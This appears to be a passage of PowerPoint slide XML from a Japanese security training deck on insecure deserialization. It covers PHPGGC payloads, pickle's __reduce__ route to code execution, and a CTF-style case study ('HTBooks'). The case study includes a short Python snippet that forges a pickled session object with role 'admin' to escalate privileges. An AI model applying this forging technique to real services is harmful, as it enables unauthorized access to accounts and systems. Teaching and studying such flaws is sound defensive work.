                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>注意：PHPGGC生成の汎用ペイロードは有効なUserSettingsオブジェクトを作らないため、RCE成立後に500エラーが出ることがある（目的がRCE取得のみなら無害）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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7F6F2"/>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48866"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3335"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Python Pickle の特有の注意点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1426766"/>
            <a:ext cx="5187950" cy="4415234"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2301"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1016000" y="1629966"/>
            <a:ext cx="4924997" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>仮想マシン向けのオペコード列</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1016000" y="1914426"/>
            <a:ext cx="4924997" cy="444500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>pickleは「Pickle Machine（PM）」が実行するプログラム。スタック＋メモを持ち、オペコードの並びで任意オブジェクトを再構築する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1019175" y="2425601"/>
            <a:ext cx="4775200" cy="344091"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 17532"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="74406" tIns="74406" rIns="0" bIns="49006" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1260"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>80 04 95 … ] 94 ( 8c 03 "HTB" … e .</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1016000" y="2861766"/>
            <a:ext cx="4924997" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHPと違い人間には読みにくいが、プロトコルのマジックバイトでブラックボックス識別は可能</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181725" y="1429941"/>
            <a:ext cx="5194300" cy="4408884"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2232"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6388100" y="1636316"/>
            <a:ext cx="4924997" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RCEに直結しやすい設計</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6388100" y="1920776"/>
            <a:ext cx="4924997" cy="654050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>pickleは __reduce__ を実装したクラスを再構築する際、任意の呼び出し可能オブジェクト＋引数を直接実行できる。PHPのように「マジックメソッドを探して連鎖させる」工程が不要な場合が多い</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6388100" y="2638326"/>
            <a:ext cx="4781550" cy="330200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4E8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="83001" tIns="57601" rIns="0" bIns="32201" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Python公式ドキュメントも明記：信頼できないソースからのデータをpickle.loads()しないこと</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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7F6F2"/>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34280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3220"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>実例：HTBooks — ソース無しでPickleを偽造する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1399480"/>
            <a:ext cx="3403600" cy="4442520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2985"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="1577280"/>
            <a:ext cx="3139440" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>バイト列が構造を自白する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="993775" y="1834455"/>
            <a:ext cx="3041650" cy="834231"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="74406" tIns="74406" rIns="0" bIns="49006" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1280"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>8c09 "util.auth"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1280"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>8c07 "Session"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1280"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>8c08 "username"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1280"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>8c04 "role"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="2748062"/>
            <a:ext cx="3139440" cy="387350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1425"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>認証Cookieをデコードしただけで、ソース非公開でもモジュール・クラス・属性名が判明する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4384675" y="1402655"/>
            <a:ext cx="3409950" cy="4436170"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2886"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4565650" y="1583630"/>
            <a:ext cx="3139440" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>① 権限昇格（Object Injection）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4565650" y="1824930"/>
            <a:ext cx="3048000" cy="890588"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5704"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="61321" tIns="61321" rIns="0" bIns="35921" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1163"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>class FakeSession: pass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1163"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>FakeSession.__module__="util.auth"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1163"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>FakeSession.__qualname__="Session"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1163"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>f=FakeSession(); f.__dict__={</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1163"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t> "username":"attacker","role":"admin"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4565650" y="2779018"/>
            <a:ext cx="3139440" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>__init__（DB照会）を経由せず role=admin を直接注入</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7966075" y="1402655"/>
            <a:ext cx="3409950" cy="4436170"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2886"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
